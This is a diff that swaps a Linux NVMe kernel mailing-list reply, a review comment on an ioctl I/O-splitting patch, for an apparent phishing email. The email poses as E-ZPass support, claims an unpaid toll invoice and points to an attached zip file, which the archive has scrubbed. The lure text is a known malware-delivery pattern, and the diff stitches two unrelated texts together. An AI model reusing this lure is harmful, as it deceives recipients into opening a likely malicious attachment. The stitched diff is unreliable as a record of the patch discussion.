@@ -1,22 +1,23 @@
-From: keith.busch@intel.com (Keith Busch)
-Date: Wed, 18 Mar 2015 18:41:15 +0000 (UTC)
-Subject: [PATCHv2] NVMe: Spliting large i/o in the ioctl path [for-linus
- branch]
-In-Reply-To: <1424779243-14951-1-git-send-email-sathya.m@samsung.com>
-References: <1424779243-14951-1-git-send-email-sathya.m@samsung.com>
-Message-ID: <alpine.LNX.2.00.1503181833470.32385@localhost.lm.intel.com>
+From: charles.simons@osushinewark.com (E-ZPass Support)
+Date: Wed, 18 Mar 2015 22:13:45 +0000
+Subject: Payment for driving on toll road, invoice #000918163
+Message-ID: <fe38f27897a56fa8fa5ed73dad9899f9@osushinewark.com>
 
-On Tue, 24 Feb 2015, Sathayavathi M wrote:
-> +	for (count = 0; count < num_split_cmds; count++) {
+Notice to Appear,
 
-[snip]
+You have a unpaid bill for using toll road.
+Please, do not forget to service your debt.
 
-> +		c.rw.reftag = cpu_to_le32(io.reftag);
-> +		c.rw.apptag = cpu_to_le16(io.apptag);
-> +		c.rw.appmask = cpu_to_le16(io.appmask);
+The copy of the invoice is attached to this email.
 
-If the reference tag is being used, this needs to be incremented
-accoringly in this loop.
+Regards,
+Charles Simons,
+E-ZPass Agent.
 
-Starting to think the ioctl shouldn't even bother correcting users who
-request malformed commands.
+-------------- next part --------------
+A non-text attachment was scrubbed...
+Name: 000918163.zip
+Type: application/zip
+Size: 3751 bytes
+Desc: not available
+URL: <http://lists.infradead.org/pipermail/linux-nvme/attachments/20150318/0e696d31/attachment.zip>
